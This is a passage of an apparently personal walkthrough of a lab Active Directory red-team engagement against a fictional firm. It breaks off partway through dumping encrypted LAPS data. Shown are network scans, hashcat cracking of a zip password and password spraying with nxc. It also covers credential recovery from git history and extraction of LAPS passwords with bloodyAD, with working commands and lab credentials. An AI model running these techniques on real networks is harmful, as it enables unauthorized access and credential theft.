# Objective and scope
You have been hired to perform a red team engagement against Trask Industries. Trask is a forward-thinking technology firm, with a heavy focus on research and development (R&D).

Trask Industries is not aware of the engagement; instead, you have been hired as a new employee in the R&D department. Your task is to begin as a "new employee" and demonstrate impact by elevating your privileges to Domain Admin (if possible).

I have also been provided a onboarding document that i will use for initial access

Also given a wordlist for any hashcracking

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn 10.0.0.5 -vv

Completed Connect Scan at 16:17, 459.70s elapsed (65535 total ports)
Nmap scan report for dc01 (10.0.0.5)
Host is up, received user-set (0.092s latency).
Scanned at 2026-09-27 16:09:38 BST for 460s
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
45985/tcp open  unknown          syn-ack
49664/tcp open  unknown          syn-ack
52200/tcp open  unknown          syn-ack
52207/tcp open  unknown          syn-ack
52224/tcp open  unknown          syn-ack
52234/tcp open  unknown          syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 459.73 seconds
```

## NMap
```python
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985 -A --min-rate=200 -sT -Pn dc01.trask.hsm 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-27 16:18 +0100
Nmap scan report for dc01.trask.hsm (10.0.0.5)
Host is up (0.093s latency).
rDNS record for 10.0.0.5: dc01

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Caddy httpd
|_http-title: Site doesn't have a title.
|_http-server-header: Caddy
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-27 15:18:19Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trask.hsm, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trask.hsm, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```



![](Pasted%20image%2020260927160217.png)

I have been given a username and a password, which i will use

```python
k.pryde:KP_TempPass_1988!
```

These credentials dont work as domain credentials

# HTTP (80)

![](Pasted%20image%2020260927162524.png)

A lot of this site is static

There is a request i can make through the `partner with us` option

There is a subdomain `www` but its the same page

## Subdomains
```python
ffuf -u http://trask.hsm/ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host: FUZZ.trask.hsm' -ic -c -t 20 -mc 301,302          

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://trask.hsm/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.trask.hsm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 20
 :: Matcher          : Response status: 301,302
________________________________________________

onboarding              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 99ms]
```

# `onboarding` subdomain 

![](Pasted%20image%2020260927172155.png)

`k.pryde` credentials log me in 

![](Pasted%20image%2020260927172505.png)

Found some users, using the format i know exists, i can validate these users

![](Pasted%20image%2020260927172922.png)

There is a password policy

There is also an option to download a zip file

The files are password protected

Ive generated a hash using zip2john but it wont crack with the provided wordlist or rockyou

# Cracking `.zip` file hash

Ill use the password policy to try and get the password for the file

```python
zip2john onboarding-documents.zip > zip.hash
```

Ill generate the hash

```python
hashcat -m 17225 -a 3 zip.hash 'ProtoTr?1?1?1?11973!' -1 ?l?d?u --user

$pkzip$8*1*1*0*8*24*f2d7*7b7442ad6d177d4bf47ca8182d3f9aa082824035aaa837db0129ee3636fcfb75bf6f2045*1*0*8*24*647d*6db32ca529faa1fa3f92b89c39699e5099e4a42baec64b8bf066f91ceb1ce16bfb8a2f8e*1*0*8*24*fd17*12a4b60107b9f8956e30705ed16fdd73e010d3b7e03e3d10dc137ae9836aa522c9ac67fd*1*0*8*24*d982*4666df7288e3d762d9a2ff1bc7227f93b150b902a80ea1e1f64980ae83e02b71e1b536ab*1*0*8*24*5cbe*d66452516e7060a2e18dfecbb699a95d1d4bd979f17a27bc820ed7d8fe4cbaffbfe4017a*1*0*8*24*6007*89cfaa97274ae290af2646e177a5fd6aa61f8183494cb8ac6fbc30672d2ace504b286dc3*1*0*8*24*157c*69b008168a6a667f32f1efa16b8affef00ce8e3b14ac05f50b856c414bfc439ab11458fd*2*0*107*19f*56099dcf*2160*3e*8*107*5609*1b2815b30df31c53c08bf1a3d14087b1d53366e4ea6709dff70b069df25c511bb1cd04440a7aa89cc036bb8db749b21a64599e7a11cb592263e4a897c0adb461ac734228a41d8ef23b90ed133853d4dac94a60cca6b6c6cabaf03af8cee9fbdc8e83221262da9ccf60a5cd9a76466413bd4f2fd6c9428a6e49cba79f70b49234e5203a3f187a37c3dc9535d75cee79cc1934b02b38367c0a6d557fc8144fc9b6bed3212f97f236ae2a7b9dcdd579260ed2842b3e133d0450985db40de15039b8ab057216e625e369cdd5a186a8ed8fad30fdff9c29f407761ccc7821311dc7a5ef924ef52ffe282bcf4e70f36a9b4ed91b3ca5f90e75c2d0031cca7585937e4300d00d0f975b2d*$/pkzip$:ProtoTra1NR1973!
```

I have cracked the hash

Ill specify the mode for zip files, and `-a 3` for bruteforce mode, then the hash file with the format.

`-1 ?l?d` = defines custom charset 1 as lowercase letters + digits (adjust to `?u?l?d` if uppercase is also possible mid-string)

There is nothing too interesting in these files, but this password used to unzip might be used as a domain credential

# User compromise via password spray

```python
j.bewick
b.trask
d.dunsire
k.curgenven
l.mitchell
k.ryan
e.parsons
```

Earlier i found a orientation schedule with some users

I can try and spray the password on one of these users

```python
nxc smb dc01.trask.hsm -u users.txt -p 'ProtoTra1NR1973!' -k --continue-on-success

SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\k.ryan:ProtoTra1NR1973!
```

`k.ryan` is compromised

# Domain enumeration

```python
nxc smb dc01.trask.hsm -u k.ryan -p 'ProtoTra1NR1973!' -k --pass-pol     
SMB         dc01.trask.hsm  445    dc01             [*]  x64 (name:dc01) (domain:trask.hsm) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\k.ryan:ProtoTra1NR1973! 
SMB         dc01.trask.hsm  445    dc01             [+] Dumping password info for domain: TRASK
SMB         dc01.trask.hsm  445    dc01             Minimum password length: 7
SMB         dc01.trask.hsm  445    dc01             Password history length: 24
SMB         dc01.trask.hsm  445    dc01             Maximum password age: 41 days 23 hours 53 minutes 
SMB         dc01.trask.hsm  445    dc01             
SMB         dc01.trask.hsm  445    dc01             Password Complexity Flags: 000001
SMB         dc01.trask.hsm  445    dc01                 Domain Refuse Password Change: 0
SMB         dc01.trask.hsm  445    dc01                 Domain Password Store Cleartext: 0
SMB         dc01.trask.hsm  445    dc01                 Domain Password Lockout Admins: 0
SMB         dc01.trask.hsm  445    dc01                 Domain Password No Clear Change: 0
SMB         dc01.trask.hsm  445    dc01                 Domain Password No Anon Change: 0
SMB         dc01.trask.hsm  445    dc01                 Domain Password Complex: 1
SMB         dc01.trask.hsm  445    dc01             
SMB         dc01.trask.hsm  445    dc01             Minimum password age: 1 day 4 minutes 
SMB         dc01.trask.hsm  445    dc01             Reset Account Lockout Counter: 10 minutes 
SMB         dc01.trask.hsm  445    dc01             Locked Account Duration: 10 minutes 
SMB         dc01.trask.hsm  445    dc01             Account Lockout Threshold: None
SMB         dc01.trask.hsm  445    dc01             Forced Log off Time: Not Set
```

No lockout policy

## Shares
```python
nxc smb dc01.trask.hsm -u k.ryan -p 'ProtoTra1NR1973!' -k --shares  
SMB         dc01.trask.hsm  445    dc01             [*]  x64 (name:dc01) (domain:trask.hsm) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\k.ryan:ProtoTra1NR1973! 
SMB         dc01.trask.hsm  445    dc01             [*] Enumerated shares
SMB         dc01.trask.hsm  445    dc01             Share           Permissions     Remark
SMB         dc01.trask.hsm  445    dc01             -----           -----------     ------
SMB         dc01.trask.hsm  445    dc01             ADMIN$                          Remote Admin
SMB         dc01.trask.hsm  445    dc01             C$                              Default share
SMB         dc01.trask.hsm  445    dc01             IPC$            READ            Remote IPC
SMB         dc01.trask.hsm  445    dc01             NETLOGON        READ            Logon server share 
SMB         dc01.trask.hsm  445    dc01             New_Employee_Onboarding READ            
SMB         dc01.trask.hsm  445    dc01             SYSVOL          READ            Logon server share
```

## Users
```python
nxc smb dc01.trask.hsm -u k.ryan -p 'ProtoTra1NR1973!' -k --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
k.pryde
e.parsons
m.mold
b.trask
k.ryan
t.filippov
j.bewick
j.prophet
n.umfrey
s.creane
e.eadie
d.spain
m.newcome
m.pallesen
c.gerrett
c.abley
d.springthorpe
h.luppitt
c.rout
j.bernt
l.applin
k.curgenven
f.bewley
b.seymer
l.tatham
l.burge
r.beatey
g.jaggers
s.gut
n.reide
u.emney
m.bollin
m.rowth
d.dunsire
s.gaythorpe
t.longstreet
n.baudains
b.swains
k.doone
l.dawes
i.gibbie
s.blanket
c.roake
o.rutley
r.mcelvine
d.larcombe
d.bernuzzi
l.thurlborn
m.lapwood
f.camsey
s.maro
c.kryszka
e.frost
l.mitchell
j.riley
t.rivers
k.curry
svc_dcsecure_agent
svc_winrm
svc_ldap
svc_web
svc_mssql
svc_security
LegacyManager
svc_mmold$
SENTINEL-PROTO$
```

Ill dump the users with rid brute to get machine accounts

There is also an interesting descriprion

```python
SMB         dc01.trask.hsm  445    dc01             LegacyManager                 2026-03-02 16:31:06 0       Deprecated account used by legacy provisioning engine. Disabled 2013.
```

It could come in handy

![](Pasted%20image%2020260927181528.png)

# Hardcoded credentials in git configuration

I found a .git dir inside the `New_Employee_Onboarding` SMB share

```python
cat HEAD              
0000000000000000000000000000000000000000 97c0194af81a19c42bcae5fb147cc449b0bbba6b investigato <215036801+investigato@users.noreply.github.com> 1772902539 -0600	commit (initial): Initial onboarding skeleton + trainer guide (contains temps for provisioning)
97c0194af81a19c42bcae5fb147cc449b0bbba6b ac5e70d6e9d7bf5f69b1b0fdc495f40057aa340c investigato <215036801+investigato@users.noreply.github.com> 1772902539 -0600	commit: Add .gitignore to exclude logs and secrets
ac5e70d6e9d7bf5f69b1b0fdc495f40057aa340c 6fe7a5c2882775e17a69a3ca51b6c9a2995cf6ac investigato <215036801+investigato@users.noreply.github.com> 1772902539 -0600	commit: Add workstation provisioning script (placeholder creds noted)
6fe7a5c2882775e17a69a3ca51b6c9a2995cf6ac ec20d3613dc1d2814d0c7530f1cd019c4c9f7ecd investigato <215036801+investigato@users.noreply.github.com> 1772902539 -0600	commit: Redact trainer passwords from Trainer_Guide
ec20d3613dc1d2814d0c7530f1cd019c4c9f7ecd 447d88d558b4a38ce61dbfb768c2193427e32eb1 investigato <215036801+investigato@users.noreply.github.com> 1772902539 -0600	commit: Update README: add changelog entry
447d88d558b4a38ce61dbfb768c2193427e32eb1 e317bd88adf75cd9a1a99fd3fd559eaaad67545a investigato <215036801+investigato@users.noreply.github.com> 1772902539 -0600	commit: Add training schedule CSV
e317bd88adf75cd9a1a99fd3fd559eaaad67545a 941ed30168bfa0df2c7a530c1a2f60113185844b investigato <215036801+investigato@users.noreply.github.com> 1772902539 -0600	commit: Add timesheet template (csv placeholder)
941ed30168bfa0df2c7a530c1a2f60113185844b 226e6d493a7e5c7c37ef9d55d5c0b5c96835a0e4 investigato <215036801+investigato@users.noreply.github.com> 1772902539 -0600	commit: Replace old docs structure with updated materials from main site
```

There is a commit to redact credentials

```python
git log --all --oneline
226e6d4 (HEAD -> main) Replace old docs structure with updated materials from main site
941ed30 Add timesheet template (csv placeholder)
e317bd8 Add training schedule CSV
447d88d Update README: add changelog entry
ec20d36 Redact trainer passwords from Trainer_Guide
6fe7a5c Add workstation provisioning script (placeholder creds noted)
ac5e70d Add .gitignore to exclude logs and secrets
97c0194 Initial onboarding skeleton + trainer guide (contains temps for provisioning)
```

Ill target the first commit

```python
git show ec20d36       
commit ec20d3613dc1d2814d0c7530f1cd019c4c9f7ecd
Author: n.umfrey <n.umfrey@trask.hsm>
Date:   Fri Nov 18 11:00:00 1988 -0600

    Redact trainer passwords from Trainer_Guide

diff --git a/3_Orientation_Materials/Trainer_Guide.md b/3_Orientation_Materials/Trainer_Guide.md
index 4ba3f3c..d619b28 100644
--- a/3_Orientation_Materials/Trainer_Guide.md
+++ b/3_Orientation_Materials/Trainer_Guide.md
@@ -8,6 +8,6 @@ Welcome trainers — below are the steps to prepare the training VM before class
 3. Connect to the management host with the account below for session-specific setup.
 
 **Temporary Login (change after each session):**
-Username: e.parsons
-Password: W3lcm2Tr4sk1988!
+Username: [Use your own username]
+Password: [Use your own password]
 Notes: This account is for in-class provisioning only. Reset after each session.
```

I have found some credentials

# Access as `e.parsons`

```python
nxc smb dc01.trask.hsm -u e.parsons -p 'W3lcm2Tr4sk1988!' -k
SMB         dc01.trask.hsm  445    dc01             [*]  x64 (name:dc01) (domain:trask.hsm) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\e.parsons:W3lcm2Tr4sk1988!
```

This user is compromised

I have also sprayed the password against all the users and got nothing

![](Pasted%20image%2020260927184556.png)

He is part of a group `R&D_auditors`, he is also the only member in the group, so likely something to do with that

# `SYSVOL` share

Since there is nothing else ill take a look in this share

```python
cat Registry.pol    
PReg[SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\LAPS;ADEncryptedPasswordHistorySize;;;][SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\LAPS;ADPasswordEncryptionEnabled;;;][SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\LAPS;ADPasswordEncryptionPrincipal;;&;TRASK\R&D_Auditors][SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\LAPS;AdministratorAccountName;;;lab-admin][SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\LAPS;BackupDirectory;;;][SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\LAPS;PasswordExpirationProtectionEnabled;;;][SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\LAPS;PasswordComplexity;;;][SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\LAPS;PasswordLength;;;
                                                   ][SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\LAPS;PasswordAgeDays;;;][SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\LAPS;PostAuthenticationResetDelay;;;][SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\LAPS;PostAuthenticationActions;;;]
```

This shows a local account `lab-admin` being managed by LAPS and the AD group `R&D_auditors` can read encrypted LAPS password 

```python
bloodyAD --host dc01.trask.hsm -d trask.hsm -u 'e.parsons' -p 'W3lcm2Tr4sk1988!' -k get object 'SENTINEL-PROTO$' --attr msLAPS-EncryptedPassword

distinguishedName: CN=SENTINEL-PROTO,OU=Servers,DC=trask,DC=hsm
msLAPS-EncryptedPassword: bKrcAdKC6gfPBAAAAAAAADCCBEUGCSqGSIb3DQEHA6CCBDYwggQyAgECMYID/qKCA/oCAQQwggO8BIIDZAEAAABLRFNLAwAAAGsBAAAeAAAAFAAAAGzQvgrT1Npec3pYv4UKiOoIAwAAFAAAABQAAABESFBCAAEAAIeo5h20tmY8/7vRnGUZWZmM7vYIZg3Q8l0s7tRDXjsA4A348dYZV9T6999FYbKqMBbD2RE0CW+qO/QpbYMOmnwgngxkl1F6vVqKnTBrz2ftkfnmcltHWMAi4LHvQnW/e2xb/BHUX5CIuUH1TrHlm7i8OaC/EjB/XE/bcMWBsj92tjrK4cqmt5AtUlJnNUiKDvE8bZpRv6SrOtg0d5ZSTY72oWe1pBgl2WfhROUUBWQlHMrLg+a0hvazyj95cVBgJsC4V/aJlihW3tQBCr0L5iHDo5YKVOcQw3XyY3XXAUEDpLVDMMGYrxJhFtInbhFxX2k4d/rX7wnK2wlK6R4aFZc/syybcxNNCy53UGZg7b1ITKexjyHvIFQH9Hk6GguhJRDbwVB3vkY//0/tSqwLtVW+OmwbDGtHsbw3c79+jG9ikBIo+MKMuxilWuMTQQAKZQGW+THHelfy3fRj5ensFEt3feYqqrioYorDdtKC1u04ZOZ5gkKOvIMdFDSPby+Rk7UEWvJ2cWTh38lnwfs/LlWkvRv/6DucgNBSuYXRguoK2yo7cxPT/hTISEseBSWIubfSu9LfAWGZ7NBuFVfNCRWzNTu7ZODsN3/QKDcN+StSx4kUKM3GfrYYS1I9HbJGwy9jB4SQ8A741kfRSNR5VFFeIyfP75jFgmZLTA9sxBZZCJE8glNWCebOVZHyd/h9RW/W2u/1lVTY35bCt0X5OmR/xFVeY10IoXVLTU4dLcHBg2myDBoczqtz+P6fmhh/svh5mfXkBCBlwclEfWvhRf7R8ZN7JC4jHpJDb31WrjR/kITKiTyvFCbgzQFFiPe6reaM/ajSxsp7hl8cjEbpjFwUMZVAr/tEs3MJT1rlYnOllhs5UOgbdSm9Nay2H9WQh93m7ZGX0Io5M8FQThPYgbHvo28xDcJ2ddfdtafX9r28Qu272lYR46adJ3gS3ink9uhMc1OSHz+swOz8/KZKPf3NJ1RTZbPAb7brCzpdEmIiJUOMDO1epsFip2iHYHMDjHQAcgBhAHMAawAuAGgAcwBtAAAAdAByAGEAcwBrAC4AaABzAG0AAAAwUgYJKwYBBAGCN0oBMEUGCisGAQQBgjdKAQEwNzA1MDMMA1NJRAwsUy0xLTUtMjEtOTM5NzQ5NDQ1LTQwOTQ5NTQ4MzAtMTgwMDgwNzczLTExMTEwCwYJYIZIAWUDBAEtBCi+mHDb7cD/Ehb+JotFfzuEm90fIY8jjKVBIjOzID+q2Bx93DCGnwNtMCsGCSqGSIb3DQEHATAeBglghkgBZQMEAS4wEQQMlFJiwlFFNZIBHGqEAgEQmWw7JF4ScYD8v8G+j2cCscy+XXb6AiC/jZrW6pHZggL2IFncMaUV7DymaByBtXDavQ+9cdYpVTXg1YAat3fOFycnsmhROtWGnASFp8+9zTIL5AJuXOBuezls4A7tzWTwL7jJj7fWFG0SBvF7vmXPc0LSy9SPcYouB9VDWGisleA+2vF1sUo=
```

Ill grab the value using bloodyAD, but this is the raw encrpyted value, i need the decrypted value

![](Pasted%20image%2020260928184554.png)

![](Pasted%20image%2020260928200032.png)

Ill use the `msldap laps` command built into bloodyAD to grab the raw value then it will also fetche the required key material to decrypt the said encrypted value

# Decrypting LAPS password

So after some research, the top value is the current password and the bottom 5 values are actually the previous passwords that have been set

To do this ill use dpapi-ng and a custom script

https://github.com/jborean93/dpapi-ng/tree/main

Ill install it using:

```python
python3 -m venv venv

source venv/bin/activate

pip3 install dpapi-ng

pip3 install dpapi-ng[kerberos]
```

Now the required tools are available

This is where my custom script comes in

```python
sudo nxc smb dc01.trask.hsm -u e.parsons -p 'W3lcm2Tr4sk1988!' -k --generate-krb5-file /etc/krb5.conf
[sudo] password for kali: 
SMB         dc01.trask.hsm  445    dc01             [*]  x64 (name:dc01) (domain:trask.hsm) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.trask.hsm  445    dc01             [+] krb5 conf saved to: /etc/krb5.conf
SMB         dc01.trask.hsm  445    dc01             [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\e.parsons:W3lcm2Tr4sk1988!

export KRB5_CONFIG=/etc/krb5.conf

nxc smb dc01.trask.hsm -u e.parsons -p 'W3lcm2Tr4sk1988!' -k --generate-tgt e.parsons            
SMB         dc01.trask.hsm  445    dc01             [*]  x64 (name:dc01) (domain:trask.hsm) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\e.parsons:W3lcm2Tr4sk1988! 
SMB         dc01.trask.hsm  445    dc01             [+] TGT saved to: e.parsons.ccache
SMB         dc01.trask.hsm  445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=e.parsons.ccache

export KRB5CCNAME=e.parsons.ccache
```

Ill also get a TGT for my user and setting my krb5.conf file

Ill then place the full output from bloodyAD into a file including the LAPS password history

```python
cat lapspasswords.txt
SENTINEL-PROTO : 6caadc01d282ea07cf040000000000003082044506092a864886f70d010703a082043630820432020102318203fea28203fa020104308203bc04820364010000004b44534b030000006b0100001e000000140000006cd0be0ad3d4da5e737a58bf850a88ea080300001400000014000000444850420001000087a8e61db4b6663cffbbd19c651959998ceef608660dd0f25d2ceed4435e3b00e00df8f1d61957d4faf7df4561b2aa3016c3d91134096faa3bf4296d830e9a7c209e0c6497517abd5a8a9d306bcf67ed91f9e6725b4758c022e0b1ef4275bf7b6c5bfc11d45f9088b941f54eb1e59bb8bc39a0bf12307f5c4fdb70c581b23f76b63acae1caa6b7902d52526735488a0ef13c6d9a51bfa4ab3ad8347796524d8ef6a167b5a41825d967e144e5140564251ccacb83e6b486f6b3ca3f7971506026c0b857f689962856ded4010abd0be621c3a3960a54e710c375f26375d7014103a4b54330c198af126116d2276e11715f693877fad7ef09cadb094ae91e1a15973fb32c9b73134d0b2e77506660edbd484ca7b18f21ef205407f4793a1a0ba12510dbc15077be463fff4fed4aac0bb555be3a6c1b0c6b47b1bc3773bf7e8c6f62901228f8c28cbb18a55ae31341000a650196f931c77a57f2ddf463e5e9ec144b777de62aaab8a8628ac376d282d6ed3864e67982428ebc831d14348f6f2f9193b5045af2767164e1dfc967c1fb3f2e55a4bd1bffe83b9c80d052b985d182ea0adb2a3b7313d3fe14c8484b1e052588b9b7d2bbd2df016199ecd06e1557cd0915b3353bbb64e0ec377fd028370df92b52c7891428cdc67eb6184b523d1db246c32f63078490f00ef8d647d148d47954515e2327cfef98c582664b4c0f6cc4165908913c82535609e6ce5591f277f87d456fd6daeff59554d8df96c2b745f93a647fc4555e635d08a1754b4d4e1d2dc1c18369b20c1a1cceab73f8fe9f9a187fb2f87999f5e4042065c1c9447d6be145fed1f1937b242e231e92436f7d56ae347f9084ca893caf1426e0cd014588f7baade68cfda8d2c6ca7b865f1c8c46e98c5c14319540affb44b373094f5ae56273a5961b3950e81b7529bd35acb61fd59087dde6ed9197d08a3933c1504e13d881b1efa36f310dc27675d7ddb5a7d7f6bdbc42edbbda5611e3a69d277812de29e4f6e84c7353921f3facc0ecfcfca64a3dfdcd27545365b3c06fb6eb0b3a5d12622225438c0ced5ea6c162a768876073038c74007200610073006b002e00680073006d00000074007200610073006b002e00680073006d000000305206092b0601040182374a013045060a2b0601040182374a01013037303530330c035349440c2c532d312d352d32312d3933393734393434352d343039343935343833302d3138303038303737332d31313131300b060960864801650304012d0428be9870dbedc0ff1216fe268b457f3b849bdd1f218f238ca5412233b3203faad81c7ddc30869f036d302b06092a864886f70d010701301e060960864801650304012e3011040c945262c251453592011c6a84020110996c3b245e127180fcbfc1be8f6702b1ccbe5d76fa0220bf8d9ad6ea91d98202f62059dc31a515ec3ca6681c81b570dabd0fbd71d6295535e0d5801ab777ce172727b268513ad5869c0485a7cfbdcd320be4026e5ce06e7b396ce00eedcd64f02fb8c98fb7d6146d1206f17bbe65cf7342d2cbd48f718a2e07d5435868ac95e03edaf175b14a
SENTINEL-PROTO : [b'k\xaa\xdc\x01\x06vy\xfb\xcf\x04\x00\x00\x00\x00\x00\x000\x82\x04E\x06\t*\x86H\x86\xf7\r\x01\x07\x03\xa0\x82\x0460\x82\x042\x02\x01\x021\x82\x03\xfe\xa2\x82\x03\xfa\x02\x01\x040\x82\x03\xbc\x04\x82\x03d\x01\x00\x00\x00KDSK\x03\x00\x00\x00k\x01\x00\x00\x1e\x00\x00\x00\x14\x00\x00\x00l\xd0\xbe\n\xd3\xd4\xda^szX\xbf\x85\n\x88\xea\x08\x03\x00\x00\x14\x00\x00\x00\x14\x00\x00\x00DHPB\x00\x01\x00\x00\x87\xa8\xe6\x1d\xb4\xb6f<\xff\xbb\xd1\x9ce\x19Y\x99\x8c\xee\xf6\x08f\r\xd0\xf2],\xee\xd4C^;\x00\xe0\r\xf8\xf1\xd6\x19W\xd4\xfa\xf7\xdfEa\xb2\xaa0\x16\xc3\xd9\x114\to\xaa;\xf4)m\x83\x0e\x9a| \x9e\x0cd\x97Qz\xbdZ\x8a\x9d0k\xcfg\xed\x91\xf9\xe6r[GX\xc0"\xe0\xb1\xefBu\xbf{l[\xfc\x11\xd4_\x90\x88\xb9A\xf5N\xb1\xe5\x9b\xb8\xbc9\xa0\xbf\x120\x7f\\O\xdbp\xc5\x81\xb2?v\xb6:\xca\xe1\xca\xa6\xb7\x90-RRg5H\x8a\x0e\xf1<m\x9aQ\xbf\xa4\xab:\xd84w\x96RM\x8e\xf6\xa1g\xb5\xa4\x18%\xd9g\xe1D\xe5\x14\x05d%\x1c\xca\xcb\x83\xe6\xb4\x86\xf6\xb3\xca?yqP`&\xc0\xb8W\xf6\x89\x96(V\xde\xd4\x01\n\xbd\x0b\xe6!\xc3\xa3\x96\nT\xe7\x10\xc3u\xf2cu\xd7\x01A\x03\xa4\xb5C0\xc1\x98\xaf\x12a\x16\xd2\'n\x11q_i8w\xfa\xd7\xef\t\xca\xdb\tJ\xe9\x1e\x1a\x15\x97?\xb3,\x9bs\x13M\x0b.wPf`\xed\xbdHL\xa7\xb1\x8f!\xef T\x07\xf4y:\x1a\x0b\xa1%\x10\xdb\xc1Pw\xbeF?\xffO\xedJ\xac\x0b\xb5U\xbe:l\x1b\x0ckG\xb1\xbc7s\xbf~\x8cob\x90\x12(\xf8\xc2\x8c\xbb\x18\xa5Z\xe3\x13A\x00\ne\x01\x96\xf91\xc7zW\xf2\xdd\xf4c\xe5\xe9\xec\x14Kw}\xe6*\xaa\xb8\xa8b\x8a\xc3v\xd2\x82\xd6\xed8d\xe6y\x82B\x8e\xbc\x83\x1d\x144\x8fo/\x91\x93\xb5\x04Z\xf2vqd\xe1\xdf\xc9g\xc1\xfb?.U\xa4\xbd\x1b\xff\xe8;\x9c\x80\xd0R\xb9\x85\xd1\x82\xea\n\xdb*;s\x13\xd3\xfe\x14\xc8HK\x1e\x05%\x88\xb9\xb7\xd2\xbb\xd2\xdf\x01a\x99\xec\xd0n\x15W\xcd\t\x15\xb35;\xbbd\xe0\xec7\x7f\xd0(7\r\xf9+R\xc7\x89\x14(\xcd\xc6~\xb6\x18KR=\x1d\xb2F\xc3/c\x07\x84\x90\xf0\x0e\xf8\xd6G\xd1H\xd4yTQ^#\'\xcf\xef\x98\xc5\x82fKL\x0fl\xc4\x16Y\x82\xe7d\xfa\xe4\x9b=`\x856tx\xf6X\x96\xb4=I\xcb\x06\xe0\xe5Z\x8b\x08\xe5\xe1\xba\xd1\\\x93\xda\xf4\x01\xc6^\x84\xa0"\xb5[\xa2M\xb8\xc0?\xb3\'\x14\xb9\x97\x19:\x96j(e;\x88\xe5\xe6\x8a\x0e\x85Y\x00\xf1\xa2^\xf4K\xfe\xc4\x92D\xfa\xea\x12\xb41\x03i\xb44\n\xd4\xf3\xda\xeay\xbb\xc3\x04f[$U;\xe9&\xbc\x8d\xbc\x1b\x96\x90\xd6P\xf7s\x04\xd2\xab5&\x07r\xa4\xfe\xb4\xdd\x17I\xd72\xdb\x0e\x91"\x94\xc5\x811\xae\xedp\x1ex\xa3\xb0\xbd5d<b\xef\x84\xdc\xf9\x10\x99]<\xe1\xd6\x0c\xedI\x14\x81\xe9\x07\xea#\xda\xda9\x12J[\xa8\x97\xba\x11\xd7\x80Y\xf1-9\xa1"t\xfcx\xcd>\xba\x1bh\xc2p\x929/\x12\xf1\xdb\x01\x1e\xa0;h\x02\x91v\xeelW\xf3\x019\x1c\xbc\x14r\xd9U\x86\xc7Y^\xc8\xbc_\xa0\xbde\xe8\x12\x94\x99[\xcdA\xf2J=O\x14\xce\xb56\x99:\xbd\x87\x99k\xbf\xc8[5h\xf7\xaat\x00r\x00a\x00s\x00k\x00.\x00h\x00s\x00m\x00\x00\x00t\x00r\x00a\x00s\x00k\x00.\x00h\x00s\x00m\x00\x00\x000R\x06\t+\x06\x01\x04\x01\x827J\x010E\x06\n+\x06\x01\x04\x01\x827J\x01\x01070503\x0c\x03SID\x0c,S-1-5-21-939749445-4094954830-180080773-11110\x0b\x06\t`\x86H\x01e\x03\x04\x01-\x04(/\